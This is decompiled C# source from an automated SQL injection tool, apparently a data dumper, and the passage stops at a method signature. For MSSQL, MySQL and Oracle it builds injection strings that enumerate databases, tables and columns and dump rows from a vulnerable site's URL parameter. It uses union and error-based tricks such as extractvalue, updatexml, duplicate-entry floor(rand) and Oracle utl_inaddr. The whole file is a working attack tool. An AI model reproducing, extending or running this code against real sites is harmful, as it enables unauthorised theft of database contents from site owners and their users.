using System.Collections.Generic;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// DataBase
namespace DataBase
{
    public enum InjectionType
    {
        None,
        Union,
        Error
    }

	public class MSSQL
	{
		private const string CODE_ERROR = "convert(int,(%K%+(#)+%K%))";

		private const string CODE_ERROR_COLLATE = "convert(int,(%K%+(#)+%K%) COLLATE SQL_Latin1_General_Cp1254_CS_AS)";

		private static string GetQuery(InjectionType oError, bool bCollateLatin)
		{
			if (oError != InjectionType.Error)
			{
				return "(%K%+(#)+%K%)";
			}
			if (bCollateLatin)
			{
				return "convert(int,(%K%+(#)+%K%) COLLATE SQL_Latin1_General_Cp1254_CS_AS)";
			}
			return "convert(int,(%K%+(#)+%K%))";
		}

		public static string Info(string sTraject, InjectionType oError, bool bCollateLatin, List<string> lColumn, string sCastType, string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "+", "char");
			string str = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "+", "char");
			string text2 = MSSQL.GetQuery(oError, bCollateLatin);
			checked
			{
				string text3;
				if (lColumn.Count == 1)
				{
					text3 = text.Replace("#", lColumn[0].Trim());
				}
				else
				{
					text3 = "select (";
					int arg_A2_0 = 0;
					int num = lColumn.Count - 1;
					for (int i = arg_A2_0; i <= num; i++)
					{
						if (i > 0)
						{
							text3 = text3 + "+" + str + "+";
						}
						string str2 = text.Replace("#", lColumn[i].Trim());
						text3 += str2;
					}
					text3 += ") as t";
				}
				text2 = text2.Replace("%K%", newValue);
				text2 = text2.Replace("#", text3);
				text2 = global::Globals.G_Utilities.EncodeURL(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		public static string DataBases(string sTraject, InjectionType oError, bool bCorrentDB, string sCastType, bool bCollateLatin, int iDbId, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "+", "char");
			string text2 = MSSQL.GetQuery(oError, bCollateLatin);
			text2 = text2.Replace("%K%", newValue);
			checked
			{
				if (bCorrentDB)
				{
					text2 = text2.Replace("#", text.Replace("#", "DB_NAME()"));
				}
				else if (string.IsNullOrEmpty(sWhere))
				{
					text2 = text2.Replace("#", "select distinct top 1 # from [master]..[sysdatabases] where [dbid]=" + Conversions.ToString(iDbId + 1));
				}
				else
				{
					string text3 = "isnull(#,char(32))";
					text3 = text.Replace("#", text3);
					text3 = text3.Replace("#", "[name]");
					text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select top 1 " + text3 + " from " + "(select top %INDEX% [name] " + "from [master]..[sysdatabases] " + "where " + sWhere, Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), " order by " + sOrderBy + ", [name] asc", " order by [name] asc")), ")"), "sq order by [name] desc")));
					text2 = text2.Replace("%INDEX%", Conversions.ToString(iDbId + 1));
				}
				text2 = text2.Replace("#", text.Replace("#", "[name]"));
				text2 = global::Globals.G_Utilities.EncodeURL(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		public static string Tables(string sTraject, string sDataBase, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "+", "char");
			string text2 = MSSQL.GetQuery(oError, bCollateLatin);
			text2 = text2.Replace("%K%", newValue);
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select distinct top 1 # from [" + sDataBase + "]..[sysobjects] " + "where id=" + "(select top 1 id from " + "(select distinct top " + Conversions.ToString(checked(iIndex + 1)) + " id from [" + sDataBase + "]..[sysobjects] " + "where xtype=char(85) ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), "order BY id ASC) "), " sq order BY id DESC)")));
			text2 = text2.Replace("#", text.Replace("#", "[name]"));
			text2 = global::Globals.G_Utilities.EncodeURL(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		public static string Columns(string sTraject, string sDataBase, string sTable, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "+", "char");
			string text2 = MSSQL.GetQuery(oError, bCollateLatin);
			text2 = text2.Replace("%K%", newValue);
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select distinct top 1 # from [" + sDataBase + "]..[syscolumns] " + "where id=(select id from [" + sDataBase + "]..[sysobjects] where [name]=%TB%)" + " and [name] not in " + "(select distinct top %INDEX% [name] from [" + sDataBase + "]..[syscolumns] where id=" + "(select top 1 id from [" + sDataBase + "]..[sysobjects] where [name]=%TB%", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"), ")")));
			text2 = text2.Replace("%TB%", global::Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "+", "char"));
			text2 = text2.Replace("%INDEX%", Conversions.ToString(iIndex));
			text2 = text2.Replace("#", text.Replace("#", "[name]"));
			text2 = global::Globals.G_Utilities.EncodeURL(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		public static string Dump(string sTraject, string sDataBase, string sTable, List<string> lColumn, bool bIFNULL, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndurl = "", string sCustomQuery = "", int iMSQLErrCIndex = -1)
		{
			string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string text2 = Conversions.ToString(Interaction.IIf(true, "isnull(#,char(" + Conversions.ToString(32) + "))", "#"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "+", "char");
			string text3 = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "+", "char");
			string text4 = MSSQL.GetQuery(oError, bCollateLatin);
			checked
			{
				if (string.IsNullOrEmpty(sCustomQuery))
				{
					string text5 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select top 1 %cs% from(select top [x] %cl% from [%db%]..[%tb%] ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", "where " + sWhere + " ")), "order by %cs2% asc"), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", "," + sOrderBy)), ") "), "sq order by %cs2% desc"));
					if (string.IsNullOrEmpty(sDataBase))
					{
						text5 = text5.Replace("[%db%]..", "");
					}
					string text6 = "";
					string text7 = "";
					text5 = text5.Replace("%cs2%", "[" + lColumn[0].Trim() + "]");
					if (lColumn.Count == 1)
					{
						text5 = text5.Replace("%cs%", text2.Replace("#", "[" + lColumn[0].Trim() + "]"));
						text5 = text5.Replace("%cl%", text2.Replace("#", "[" + lColumn[0].Trim() + "]"));
					}
					else
					{
						int arg_1E6_0 = 0;
						int num = lColumn.Count - 1;
						for (int i = arg_1E6_0; i <= num; i++)
						{
							if (i > 0)
							{
								text6 = text6 + "+" + text3 + "+";
							}
							if (i > 0)
							{
								text7 += ",";
							}
							if (i == iMSQLErrCIndex)
							{
								text5 = text5.Replace("%cs%", text2.Replace("#", text.Replace("#", "[" + lColumn[i].Trim() + "]")));
								text6 = text6 + "[" + lColumn[i].Trim() + "]";
							}
							else
							{
								text6 += text.Replace("#", text2.Replace("#", text.Replace("#", "[" + lColumn[i].Trim() + "]")));
							}
							text7 = text7 + "[" + lColumn[i].Trim() + "]";
						}
						text5 = text5.Replace("%cs%", text6);
					}
					text5 = text5.Replace("%cl%", text7);
					text4 = text4.Replace("#", text5);
				}
				else
				{
					text4 = text4.Replace("#", sCustomQuery);
				}
				text4 = text4.Replace("%db%", sDataBase);
				text4 = text4.Replace("%tb%", sTable);
				text4 = text4.Replace("[s]", text3);
				text4 = text4.Replace("[x]", Conversions.ToString(iIndex + 1));
				text4 = text4.Replace("%K%", newValue);
				text4 = global::Globals.G_Utilities.EncodeURL(text4);
				return sTraject.Replace("[t]", text4) + sEndurl;
			}
		}

		public static string Count(string sTraject, InjectionType oError, string sCastType, bool bCollateLatin, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "+", "char");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "+", "char");
			string text = MSSQL.GetQuery(oError, bCollateLatin);
			switch (o)
			{
			case Schema.DATABASES:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [master]..[sysdatabases]", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere))));
				break;
			case Schema.TABLES:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[sysobjects] " + "where xtype=char(85)", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere))));
				break;
			case Schema.COLUMNS:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[syscolumns] " + "where id=" + "(select id from  [" + sDataBase + "]..[sysobjects] where [name]=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "+", "char") + ")", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere))));
				break;
			case Schema.ROWS:
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[" + sTable + "] ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", "where " + sWhere))));
				break;
			}
			text = text.Replace("#", "cast(count(*) as char)");
			text = text.Replace("%K%", newValue);
			text = global::Globals.G_Utilities.EncodeURL(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}
	}

	public enum MySQLCollactions : byte
	{
		None,
		UnHex,
		Binary,
		CastAsChar,
		Compress,
		ConvertUtf8,
		ConvertLatin1,
		Aes_descrypt
	}

	public enum MySQLErrorType : byte
	{
		DuplicateEntry,
		ExtractValue,
		UpdateXML
	}

	public class MySQLNoError
	{
        public static string Info(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, List<string> lColumn, string sEndUrl = "")
        {
            string mySQLCollaction = Utls.GetMySQLCollaction(oCollaction);
            string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(#)", "#"));
            string text = "";
            checked
            {
                string text2;
                if (sTraject.ToLower().Contains(" into outfile") | sTraject.ToLower().Contains(" into dumpfile"))
                {
                    text = lColumn[0].Trim();
                    text2 = mySQLCollaction;
                    text2 = text2.Replace("#", text);
                }
                else
                {
                    int arg_75_0 = 0;
                    int num = lColumn.Count - 1;
                    for (int i = arg_75_0; i <= num; i++)
                    {
                        if (i > 0)
                        {
                            text = text + "," + Globals.COLLUMNS_SPLIT + ",";
                        }
                        string str = lColumn[i].Trim();
                        text += str;
                    }
                    text2 = mySQLCollaction;
                    text2 = text2.Replace("#", string.Concat(new string[]
					{
						"concat(",
						    Globals.DATA_SPLIT,
						    ",#,",
						    Globals.DATA_SPLIT,
						")"
					}));
                    text2 = text2.Replace("#", newValue);
                    if (lColumn.Count > 1)
                    {
                        text2 = text2.Replace("#", "concat(" + text + ")");
                    }
                    else
                    {
                        text2 = text2.Replace("#", text);
                    }
                }
                string text3 = sTraject.Replace("[t]", text2) + sEndUrl;
                return text3.Replace("  ", " ");
            }
        }

		public static string DataBases(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string mySQLCollaction = Utls.GetMySQLCollaction(oCollaction);
			string text = "(select distinct " + mySQLCollaction;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				global::Globals.DATA_SPLIT,
				",#,",
				global::Globals.DATA_SPLIT,
				")"
			}));
			string str;
			if (limitX == -1)
			{
				text = text.Replace("#", "group_concat(schema_name)");
				str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.schemata", Interaction.IIf(bCorrentDB, " where schema_name=database() and not schema_name=" + global::Globals.G_Utilities.ConvertTextToHex("information_schema"), " where not schema_name=" + global::Globals.G_Utilities.ConvertTextToHex("information_schema"))), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
			}
			else
			{
				text = text.Replace("#", "schema_name");
				str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.schemata where not schema_name=" + global::Globals.G_Utilities.ConvertTextToHex("information_schema"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			text = text + str + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}

		public static string Tables(string sTraject, MySQLCollactions oCollaction, string sDataBase, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string mySQLCollaction = Utls.GetMySQLCollaction(oCollaction);
			string text = "(select distinct " + mySQLCollaction;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				global::Globals.DATA_SPLIT,
				",#,",
				global::Globals.DATA_SPLIT,
				")"
			}));
			string str;
			if (limitX == -1)
			{
				text = text.Replace("#", "group_concat(table_name)");
				str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + global::Globals.G_Utilities.ConvertTextToHex(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
			}
			else
			{
				text = text.Replace("#", "table_name");
				str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + global::Globals.G_Utilities.ConvertTextToHex(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			text = text + str + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}

		public static string Columns(string sTraject, MySQLCollactions oCollaction, string sDataBase, string sTable, bool bDataType, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string mySQLCollaction = Utls.GetMySQLCollaction(oCollaction);
			string text = "(select distinct " + mySQLCollaction;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				global::Globals.DATA_SPLIT,
				",#,",
				global::Globals.DATA_SPLIT,
				")"
			}));
			string str;
			if (limitX == -1)
			{
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("group_concat(column_name", Interaction.IIf(bDataType, ",0x3a,replace(column_type,0x2c,0x3b)", "")), ")")));
				str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + global::Globals.G_Utilities.ConvertTextToHex(sDataBase) + " and table_name=" + global::Globals.G_Utilities.ConvertTextToHex(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
			}
			else
			{
				text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("column_name", Interaction.IIf(bDataType, ",0x3a,column_type", ""))));
				str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + global::Globals.G_Utilities.ConvertTextToHex(sDataBase) + " and table_name=" + global::Globals.G_Utilities.ConvertTextToHex(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			text = text + str + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}

		public static string Dump(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string mySQLCollaction = Utls.GetMySQLCollaction(oCollaction);
			string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(concat(#))", "#"));
			string text = Conversions.ToString(Interaction.IIf(false, "group_concat(#)", "concat(#)"));
			string text2 = Conversions.ToString(Interaction.IIf(bIFNULL, "ifnull(#,char(" + Conversions.ToString(32) + "))", "#"));
			string text3 = "(select " + mySQLCollaction;
			text3 = text3.Replace("#", text.Replace("#", global::Globals.DATA_SPLIT + ",#," + global::Globals.DATA_SPLIT));
			text3 = text3.Replace("#", newValue);
			string text4 = "";
			int arg_BA_0 = 0;
			checked
			{
				int num = lColumn.Count - 1;
				for (int i = arg_BA_0; i <= num; i++)
				{
					if (i > 0)
					{
						text4 = text4 + "," + global::Globals.COLLUMNS_SPLIT + ",";
					}
					string str = text2.Replace("#", lColumn[i].Trim());
					text4 += str;
				}
				text3 = text3.Replace("#", text4);
				string text5;
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					text5 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
				}
				else
				{
					text5 = sCustomQuery.Trim();
					text5 = text5.Replace("[x]", Conversions.ToString(limitX));
					text5 = text5.Replace("[y]", Conversions.ToString(limitY));
				}
				text3 = text3 + " " + text5 + ")";
				string text6 = sTraject.Replace("[t]", text3) + sEndUrl;
				return text6.Replace("  ", " ");
			}
		}

		public static string Count(string sTraject, MySQLCollactions oCollaction, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string str = "";
			string mySQLCollaction = Utls.GetMySQLCollaction(oCollaction);
			string text = "(select " + mySQLCollaction;
			text = text.Replace("#", string.Concat(new string[]
			{
				"concat(",
				global::Globals.DATA_SPLIT,
				",count(0),",
				global::Globals.DATA_SPLIT,
				")"
			}));
			switch (o)
			{
			case Schema.DATABASES:
				str = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.schemata where not schema_name=" + global::Globals.G_Utilities.ConvertTextToHex("information_schema"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
				break;
			case Schema.TABLES:
				str = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + global::Globals.G_Utilities.ConvertTextToHex(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
				break;
			case Schema.COLUMNS:
				str = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + global::Globals.G_Utilities.ConvertTextToHex(sDataBase) + " and table_name=" + global::Globals.G_Utilities.ConvertTextToHex(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
				break;
			case Schema.ROWS:
				str = Conversions.ToString(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)));
				break;
			}
			text = text + str + ")";
			string text2 = sTraject.Replace("[t]", text) + sEndUrl;
			return text2.Replace("  ", " ");
		}
	}

	public class MySQLWithError
	{
		private const string DUPLICATEENTRY_ERROR = "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";

		private const string TYPE_EXTRACTVALUE = "extractvalue(rand(),(select [t]))";

		private const string TYPE_UPDATEXML = "updatexml(rand(),(select [t]),0)";

		private static string GetQuery(string sTraject, MySQLErrorType oType)
		{
			string result = "";
			switch (oType)
			{
			case MySQLErrorType.DuplicateEntry:
				result = sTraject.Replace("[t]", "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)");
				break;
			case MySQLErrorType.ExtractValue:
				result = sTraject.Replace("[t]", "extractvalue(rand(),(select [t]))");
				break;
			case MySQLErrorType.UpdateXML:
				result = sTraject.Replace("[t]", "updatexml(rand(),(select [t]),0)");
				break;
			}
			return result;
		}

		public static string Info(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, List<string> lColumn, string sEndUrl = "")
		{
			string query = MySQLWithError.GetQuery(sTraject, oType);
			return MySQLNoError.Info(query, oCollaction, false, lColumn, sEndUrl);
		}

		public static string DataBases(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string query = MySQLWithError.GetQuery(sTraject, oType);
			return MySQLNoError.DataBases(query, oCollaction, false, bCorrentDB, sWhere, sOrderBy, sEndUrl, limitX, limitY);
		}

		public static string Tables(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, string sDataBase, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string query = MySQLWithError.GetQuery(sTraject, oType);
			return MySQLNoError.Tables(query, oCollaction, sDataBase, sWhere, sOrderBy, sEndUrl, limitX, limitY);
		}

		public static string Columns(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, string sDataBase, string sTable, bool bDataType, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
		{
			string query = MySQLWithError.GetQuery(sTraject, oType);
			return MySQLNoError.Columns(query, oCollaction, sDataBase, sTable, bDataType, sWhere, sOrderBy, sEndUrl, limitX, limitY);
		}

		public static string Dump(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sEndUrl = "", string sWhere = "", string sOrderBy = "", string sCustomQuery = "")
		{
			string query = MySQLWithError.GetQuery(sTraject, oType);
			return MySQLNoError.Dump(query, oCollaction, false, bIFNULL, sDataBase, sTable, lColumn, limitX, limitY, sWhere, sOrderBy, sEndUrl, sCustomQuery);
		}

		public static string Count(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string query = MySQLWithError.GetQuery(sTraject, oType);
			return MySQLNoError.Count(query, oCollaction, o, sDataBase, sTable, sWhere, sEndUrl);
		}
	}

	public class Oracle
	{
		private const string CAST_ASCHAR = "cast(# as char(255))";

		private const string UNION = "select # from dual";

		private const string CONCAT = "(%K%||#||%K%)";

		private const string ERROR_GET_HOST_ADDRESS = "utl_inaddr.get_host_address(#)";

		private const string ERROR_DRITHSX_SN = "ctxsys.drithsx.sn(1,#)";

		private const string ERROR_GETMAPPINGXPATH = "ordsys.ord_dicom.getmappingxpath(#,1,1)";

		private static string GetQuery(InjectionType oMethod, OracleErrorType oType)
		{
			string result = "";
			if (oMethod == InjectionType.Error)
			{
				switch (oType)
				{
				case OracleErrorType.NONE:
					result = "#";
					break;
				case OracleErrorType.GET_HOST_ADDRESS:
					result = "utl_inaddr.get_host_address(#)";
					break;
				case OracleErrorType.DRITHSX_SN:
					result = "ctxsys.drithsx.sn(1,#)";
					break;
				case OracleErrorType.GETMAPPINGXPATH:
					result = "ordsys.ord_dicom.getmappingxpath(#,1,1)";
					break;
				}
				return result;
			}
			return "#";
		}

		public static string Info(string sTraject, InjectionType oMethod, OracleErrorType bError, List<string> lColumn, bool bCastAsChar, string sEndUrl = "")
		{
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			string str = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			checked
			{
				string text2;
				if (lColumn.Count == 1)
				{
					text2 = "(%K%||#||%K%)".Replace("#", text.Replace("#", lColumn[0].Trim()));
				}
				else
				{
					text2 = "";
					int arg_98_0 = 0;
					int num = lColumn.Count - 1;
					for (int i = arg_98_0; i <= num; i++)
					{
						if (i > 0)
						{
							text2 = text2 + "||" + str + "||";
						}
						string str2 = text.Replace("#", lColumn[i].Trim());
						text2 += str2;
					}
					text2 = "(%K%||#||%K%)".Replace("#", text2);
				}
				string text3 = Oracle.GetQuery(oMethod, bError);
				text3 = text3.Replace("#", text2.Replace("%K%", newValue));
				text3 = global::Globals.G_Utilities.EncodeURL(text3);
				return sTraject.Replace("[t]", text3) + sEndUrl;
			}
		}

		public static string DataBases(string sTraject, InjectionType oMethod, MySQLErrorType bError, bool bCastAsChar, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", List<string> lDBsAdded = null)
		{
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			checked
			{
				string text2;
				if (bCorrentDB)
				{
					text2 = "(select " + text.Replace("#", "global_name") + "from global_name)";
				}
				else if (lDBsAdded.Count == 0)
				{
					text2 = "(select distinct owner from all_tables where rownum = 1)";
				}
				else
				{
					text2 = "(select distinct owner from all_tables where rownum = 1 and not owner in (";
					int arg_9F_0 = 0;
					int num = lDBsAdded.Count - 1;
					for (int i = arg_9F_0; i <= num; i++)
					{
						if (i > 0)
						{
							text2 += ",";
						}
						text2 += global::Globals.G_Utilities.ConvertTextToSQLChar(lDBsAdded[i], false, "||", "chr");
					}
					text2 += ")";
					if (!string.IsNullOrEmpty(sWhere))
					{
						text2 = text2 + " and " + sWhere;
					}
					if (!string.IsNullOrEmpty(sOrderBy))
					{
						text2 = text2 + " order by " + sOrderBy;
					}
					text2 += ")";
				}
				text2 = "(%K%||#||%K%)".Replace("#", text2);
				text2 = Oracle.GetQuery(oMethod, (OracleErrorType)bError).Replace("#", text2);
				text2 = text2.Replace("%K%", newValue);
				text2 = global::Globals.G_Utilities.EncodeURL(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		public static string Tables(string sTraject, InjectionType oMethod, MySQLErrorType bError, string sDataBase, bool bCastAsChar, int iIndex, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select table_name from (select rownum r, table_name from all_tables where owner = " + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where r = "), checked(iIndex + 1)), ")"));
			text = "(%K%||#||%K%)".Replace("#", text);
			text = Oracle.GetQuery(oMethod, (OracleErrorType)bError).Replace("#", text);
			text = text.Replace("%K%", newValue);
			text = global::Globals.G_Utilities.EncodeURL(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}

		public static string Columns(string sTraject, InjectionType oMethod, MySQLErrorType bError, string sDataBase, string sTable, bool bCastAsChar, int iIndex, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
